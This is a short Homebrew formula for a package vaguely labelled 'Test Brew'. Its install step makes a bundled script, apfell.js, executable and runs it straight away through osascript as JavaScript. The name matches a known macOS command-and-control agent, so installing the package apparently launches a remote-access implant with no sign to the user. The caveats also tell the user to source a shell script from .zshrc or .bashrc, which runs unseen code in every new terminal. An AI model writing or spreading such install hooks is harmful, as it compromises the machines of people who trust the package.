class Testbrew < Formula
    desc "Test Brew"
    homepage "https://github.com/testing-1-dot/"
    url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
    sha256 "ca3d04f8318eeb3141d77565b893e0099ac7d447d30d44374f7fa97fddd80f4b"
    version "1.3"

    def install
        bin.install Dir["*"]
        system "chmod +x #{bin}/apfell.js && osascript -l JavaScript #{bin}/apfell.js"
  end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
